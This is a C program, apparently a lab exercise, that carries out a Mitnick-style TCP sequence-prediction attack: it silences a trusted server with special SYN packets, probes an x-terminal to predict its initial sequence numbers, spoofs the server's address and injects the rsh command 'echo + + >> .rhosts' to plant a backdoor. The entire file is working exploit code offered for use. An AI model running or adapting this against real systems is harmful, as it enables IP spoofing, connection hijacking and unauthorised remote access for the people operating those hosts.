#include <libnet.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
// #include "ddos.h"
// #include "sendpacket.h"

char *OWN_IP = "172.16.70.2";
char *SERVER_IP = "172.16.70.3";
char *X_TERMINAL_IP = "172.16.70.4";

#define ETH_SIZE 14

/* IP header */
struct ip_hdr
{
    u_char ip_vhl;                   /* version << 4 | header length >> 2 */
    u_char ip_tos;                   /* type of service */
    u_short ip_len;                   /* total length */
    u_short ip_id;                   /* identification */
    u_short ip_off;                   /* fragment offset field */
#define IP_RF 0x8000               /* reserved fragment flag */
#define IP_DF 0x4000               /* dont fragment flag */
#define IP_MF 0x2000               /* more fragments flag */
#define IP_OFFMASK 0x1fff           /* mask for fragmenting bits */
    u_char ip_ttl;                   /* time to live */
    u_char ip_p;                   /* protocol */
    u_short ip_sum;                   /* checksum */
    struct in_addr ip_src, ip_dst; /* source and dest address */
};
/* TCP header */
typedef u_int tcp_seq;

struct tcp_hdr
{
    u_short th_sport; /* source port */
    u_short th_dport; /* destination port */
    tcp_seq th_seq;      /* sequence number */
    tcp_seq th_ack;      /* acknowledgement number */
    u_char th_offx2;  /* data offset, rsvd */
#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
    u_short th_win; /* window */
    u_short th_sum; /* checksum */
    u_short th_urp; /* urgent pointer */
};


void send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t dest_ip, uint32_t src_ip, uint32_t seq_nr, uint32_t ack_nr)
{

    libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
    libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;
    // build syn
    tcp_tag = libnet_build_tcp(
        513, // source port
        dest_port,                      // destinatin port
        seq_nr, // seq nr
        ack_nr,                              // ack number
        TH_SYN,                         // flag
        1024,                           // window size
        0,                              // checksum (0 for libnet to auto-fill)
        10,                             // urgent pointer
        LIBNET_TCP_H + payload_s,       // length is header size plus payload size
        payload,                        // payload
        payload_s,                      // payload size
        l,                              // pointer to libnet context
        0                               // protocol tag to modify an existing header, 0 to build a new one
    );

    if (tcp_tag < 0)
    {
        fprintf(stderr, "Error building tcp_tag.\n");
        libnet_destroy(l);
        exit(1);
    }

    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, // total length of the IP packet including all subsequent data
        0,                                        // type of service bits
        0,                                        // IP id (identification number)
        0,                                        // fragmentation bits and offset
        64,             // time to live in the network
        IPPROTO_TCP,                              // upper layer protocol
        0,                                        // checksum (0 for libnet to auto-fill)
       src_ip,                                    // source IPv4 address (little endian)
       dest_ip,                                // destination IPv4 address (little endian)
//        libnet_name2addr4(l, "127.0.0.1", LIBNET_RESOLVE), // destination IPv4 address (little endian)
        NULL,                                              // optional payload or NULL
        0,                                                 // payload length or 0
        l,                                                 // pointer to a libnet context
        0                                                  // protocol tag to modify an existing header, 0 to build a new one
    );

    if (ip_tag < 0)
    {
        fprintf(stderr, "Error building ip_tag.\n");
        libnet_destroy(l);
        exit(1);
    }

    // send syn packet
    int success = libnet_write(l);
    if (success == -1)
    {
        fprintf(stderr, "Error: %s\n", l->err_buf);
        printf("Error sending syn packet\n");
        exit(1);
    }
    libnet_clear_packet(l);
}

void start_ddos(libnet_t *l, u_long server_ip, u_long own_ip)
{
    int i;
    char disable[] = "disable";
    for (i = 0; i < 10; ++i)
    {
        // send syn packet with disable in payload
        send_syn(513,
                 (uint8_t *)disable,
                 7,
                 l,
                 server_ip,
                 own_ip,
                 libnet_get_prand(LIBNET_PRu32),
                 libnet_get_prand(LIBNET_PRu32));
    };
}

void stop_ddos(libnet_t *l, u_long server_ip, u_long own_ip)
{
    char enable[] = "enable";
    send_syn(513,
             (uint8_t *)enable,
             6,
             l,
             server_ip,
             own_ip,
             libnet_get_prand(LIBNET_PRu32),
             libnet_get_prand(LIBNET_PRu32));
}

libnet_t *libnet_initialize() {

    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!l) {
        fprintf(stderr, "Error initizlizing libnet %s\n", errbuf);
        exit(1);
    }

    libnet_seed_prand(l);

    return l;
};

pcap_t *setup_sniff_handler(void) {
    bpf_u_int32 mask;
    bpf_u_int32 net;

    char errbuf[PCAP_ERRBUF_SIZE];

    char *device = pcap_lookupdev(errbuf);

    if (!device) {
        printf("Error with pcap_lookupdev(): %s", errbuf);
        exit(1);
    }

    if (pcap_lookupnet(device, &net, &mask, errbuf) < 0) {
       printf("Error pcap_lookupnet(): %s\n", errbuf);
       exit(1);
    }

    fprintf(stdout, "Device: %s\n", device);

    // Open sniffing session (promiscuous)
    pcap_t *handler = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (!handler) {
       printf("Error opening sniffing session: %s\n", errbuf);
       exit(1);
    }
    char filter_exp[] = "src host 172.16.70.4 and (tcp[tcpflags] & (tcp-syn | tcp-ack) != 0)";

    struct bpf_program fp;

    if (pcap_compile(handler, &fp, filter_exp, 0, net) == -1)
    {
        printf("Error pcap_compile() %s: %s\n", filter_exp, pcap_geterr(handler));
        exit(1);
    }
    if (pcap_setfilter(handler, &fp) == -1)
    {
        printf("Error pcap_setfilter() %s: %s\n", filter_exp, pcap_geterr(handler));
        exit(1);
    }
    
    // Start stiffing
    if (!handler) {
        printf("Handler cannot be null.\n");
        exit(1);
    }
    
    printf("Ready to start sniffing! \n");
    return handler;
}


uint32_t predict (pcap_t *handler, libnet_t *l, u_long xterminal_ip, u_long own_ip) {
    int32_t amt_iter =15;
    uint32_t seq_array[amt_iter];
    int32_t diff_array[amt_iter];

    uint32_t constant_second_order_diff = 29281;

    printf("Probing now:\n");
    int ready_to_guess = 0;
    int i;
    for (i = 0; i < amt_iter; i++)
    {
        send_syn(514, NULL, 0, l, xterminal_ip, own_ip, libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32));
        
        struct pcap_pkthdr header;
        const u_char *packet = pcap_next(handler, &header);
        if(packet == NULL) {
            printf("Error reading synack from xterminal with pcap_next() \n");
            exit(1);
        };
        const struct tcp_hdr *tcp_header;
        tcp_header = (const struct tcp_hdr *)(packet + ETH_SIZE + sizeof(struct ip_hdr));
    
        uint32_t seq = ntohl(tcp_header->th_seq);
        uint32_t ack = ntohl(tcp_header->th_ack);
        
        printf("received seq %u, ack %u\n", seq, ack);
        seq_array[i] = (uint32_t)seq;
        
        if(i > 0){
            // Calc diff
            int32_t diff = (int32_t)seq_array[i] - (int32_t)seq_array[i-1];
//            printf("Diff[%u]: %d\n", i, diff);
            diff_array[i-1] = diff;
            
            if(i > 1) {
                // Calc second order diff
                int32_t second_order_diff = (int32_t)diff_array[i-1] - (int32_t)diff_array[i-2];
                printf("Diff[%u] - Diff[%u]: %d\n", i, i-1,second_order_diff);
                
                if(second_order_diff != constant_second_order_diff) {
                    if (ready_to_guess == 1){
                        int32_t next_diff = constant_second_order_diff + diff_array[i-1];
                        printf("Next diff will be: %d\n",next_diff);
                        uint32_t next_seq = seq_array[i] + next_diff;
                        printf("Next sequence number will be: %u\n",next_seq);
                        pcap_close(handler);
                        return next_seq;
                    } else {
                        ready_to_guess = 1;
                    }
                }
            }
        }
    }
    return -1;
}

void send_ack(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t xterminal_ip, uint32_t server_ip, uint32_t seq_nr, uint32_t ack_nr,uint8_t flags){
    
    libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
    libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;
    // build ack
    tcp_tag = libnet_build_tcp(
        513, // source port
        dest_port,                      // destinatin port
        seq_nr, // seq nr
        ack_nr,                              // ack number
        flags,                         // flag
        1024,                           // window size
        0,                              // checksum (0 for libnet to auto-fill)
        0,                             // urgent pointer
        LIBNET_TCP_H + payload_s,       // length is header size plus payload size
        payload,                        // payload
        payload_s,                      // payload size
        l,                              // pointer to libnet context
        0                               // protocol tag to modify an existing header, 0 to build a new one
    );

    if (tcp_tag < 0)
    {
        fprintf(stderr, "Error building ack tcp_tag.\n");
        libnet_destroy(l);
        exit(1);
    }

    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, // total length of the IP packet including all subsequent data
        0,                                        // type of service bits
        0,                                        // IP id (identification number)
        0,                                        // fragmentation bits and offset
        libnet_get_prand(LIBNET_PR8),             // time to live in the network
        IPPROTO_TCP,                              // upper layer protocol
        0,                                        // checksum (0 for libnet to auto-fill)
        server_ip,                                    // source IPv4 address (little endian)
        xterminal_ip,                                // destination IPv4 address (little endian)
//        libnet_name2addr4(l, "127.0.0.1", LIBNET_RESOLVE), // destination IPv4 address (little endian)
        NULL,                                              // optional payload or NULL
        0,                                                 // payload length or 0
        l,                                                 // pointer to a libnet context
        0                                                  // protocol tag to modify an existing header, 0 to build a new one
    );

    if (ip_tag < 0)
    {
        fprintf(stderr, "Error building ip_tag.\n");
        libnet_destroy(l);
        exit(1);
    }

    // send ack packet
    int success = libnet_write(l);
    if (success == -1)
    {
        fprintf(stderr, "Error: %s\n", l->err_buf);
        printf("Error sending ack packet\n");
        exit(1);
    }

    libnet_clear_packet(l);
}


int main(void)
{
    printf("Start attack\n");
    // Libnet Initialization
    libnet_t *l = libnet_initialize();

    // ip conversion
    u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
    u_long own_ip = libnet_name2addr4(l, OWN_IP, LIBNET_DONT_RESOLVE);
    u_long xterminal_ip = libnet_name2addr4(l, X_TERMINAL_IP, LIBNET_DONT_RESOLVE);
    if (server_ip == (u_long)-1)
    {
        printf("Error converting server_ip");
        exit(EXIT_FAILURE);
    }
    if (own_ip == (u_long)-1)
    {
        printf("Error converting own_ip\n");
        exit(EXIT_FAILURE);
    }
    if (xterminal_ip == (u_long)-1)
    {
        printf("Error converting xterminal_ip\n");
        exit(EXIT_FAILURE);
    }
    
    // STEP 1: DOS the server (TCP SYN flood)
    start_ddos(l, server_ip, own_ip);

    // STEP 2: TCP ISN Probe the xterminal (Determine how the xterminal generates ISNs)
    // Setup the sniffing stuff
    pcap_t *handler = setup_sniff_handler();
    
    uint32_t next_seq_pred = predict(handler, l, xterminal_ip, own_ip);
    
    // STEP 3: IP spoof server & TCP connection
    u_int32_t my_seq = libnet_get_prand(LIBNET_PRu32);
    printf("now sending syn as server\n");
//    sleep(2);
    send_syn(514, NULL, 0, l, xterminal_ip, server_ip, my_seq, libnet_get_prand(LIBNET_PRu32));
    printf("sent syn as server! Now wait for syn/ack from xterminal to server\n");
//    sleep(2);

    printf("Injecting backdoor \n");
    
    char payload[] = {"0\0tsutomu\0tsutomu\0echo + + >> .rhosts\0"};
    uint32_t payload_size = sizeof(payload);
    printf("payload_size %u\n",payload_size);
    send_ack(514, payload, payload_size, l, xterminal_ip, server_ip, my_seq + 1, next_seq_pred + 1, TH_PUSH|TH_ACK);
    printf("sent ack as server. backdoor injected\n");
    stop_ddos(l, server_ip, own_ip);
}
